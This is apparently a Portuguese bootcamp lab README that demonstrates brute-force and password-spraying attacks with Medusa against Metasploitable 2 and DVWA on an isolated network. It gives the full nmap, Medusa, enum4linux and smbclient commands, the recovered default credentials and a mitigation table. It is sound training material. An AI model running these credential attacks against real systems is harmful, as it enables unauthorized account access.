# Ataques de Força Bruta e Password Spraying com Medusa  
**Kali Linux + Metasploitable 2 + DVWA**  
Projeto prático – Bootcamp Santander Cibersegurança 2025

## Objetivo
Demonstrar, em ambiente 100% controlado e isolado, ataques reais de força bruta e password spraying utilizando a ferramenta **Medusa**, incluindo enumeração de usuários, validação de credenciais e comprovação de acesso.

## Ambiente Utilizado
- Kali Linux 2025.2 (máquina atacante)  
- Metasploitable 2 (máquina alvo) – IP: `192.168.56.101`  
- VirtualBox com rede **host-only**  

## Ataques Realizados

### 1. Scan inicial e identificação de serviços
```
ping 192.168.56.101 + nmap -sV -p 21,22,80,139,445 192.168.56.101
```
<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/56ccfb4d-d07b-4a58-8ba4-b62aadbc704e" />

---

### 2. FTP Brute Force (vsftpd 2.3.4)
Credencial encontrada: msfadmin : msfadmin

Comando utilizado:
```
medusa -h 192.168.56.101 -U ftp_users.txt -P ftp_pass.txt -M ftp -T 10 -v 6
```
<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/cbbcc389-3645-4f38-84f7-628c96e4769f" />

---

### 3. Web Brute Force – DVWA (Security Level = Low)
Credencial encontrada: admin : password

Comando utilizado:
```
medusa -h 192.168.56.101 -U web_users.txt -P web_pass.txt -M http -m FORM:"http://192.168.56.101/dvwa/vulnerabilities/brute/" -m FORM-DATA:"username=&password=&Login=Login" -m DENY-SIGNAL:"Username and/or password incorrect." -T 10 -v 6
```
<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/986e501c-4dcc-48db-b988-777c864bf15c" />

Prova de acesso ao DVWA:

<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/1f0f7680-ef48-4aab-afbb-a591e5945c07" />

---

### 4. SMB – Enumeração + Password Spraying

Enumeração de usuários:
```
enum4linux -U 192.168.56.101
```
<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/aa19bc5a-78bd-4e07-9808-f45b54d12a49" />

Password Spraying:
```
medusa -h 192.168.56.101 -U smb_users.txt -P spraying.txt -M smbnt -T 10 -t 3 -F -v 6
```

Credenciais válidas encontradas:
- msfadmin : msfadmin
- user : user

<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/e3d7032b-1276-4e6a-86cc-19feb3cf82c0" />

Prova de acesso com smbclient:
```
smbclient //192.168.56.101/tmp -U msfadmin%msfadmin
```

<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/8d91d00f-4afa-4364-b00e-87e9b5c94994" />

---

## Medidas de Mitigação Recomendadas

Vulnerabilidade | Recomendação de Segurança
----------------|---------------------------
Senhas fracas / reutilizadas | Política de complexidade + expiração periódica
Ausência de bloqueio de conta | Lockout após 3–5 tentativas falhas + CAPTCHA
Serviços legados expostos | Desabilitar FTP, SMBv1 e versões antigas do Samba
Falta de MFA | Implementar autenticação multifator
Logs insuficientes | Centralizar logs + alertas em tempo real (SIEM)

---

## Estrutura do Repositório
wordlists/ → listas de usuários e senhas usadas  
images/ → capturas de tela (nomes indicados no README)  
comandos.txt → todos os comandos executados  

---

## Conclusão
Este laboratório demonstra que ataques simples como força bruta e password spraying ainda são extremamente eficientes contra sistemas negligenciados ou com configurações padrão.

Medidas básicas como uso de senhas fortes, lockout de conta, MFA e desativação de serviços obsoletos são suficientes para mitigar a maioria dos ataques.

Todo o trabalho foi realizado de forma ética, em ambiente isolado, exclusivamente para fins educacionais.

Feito por Erick Costa – Novembro/2025  
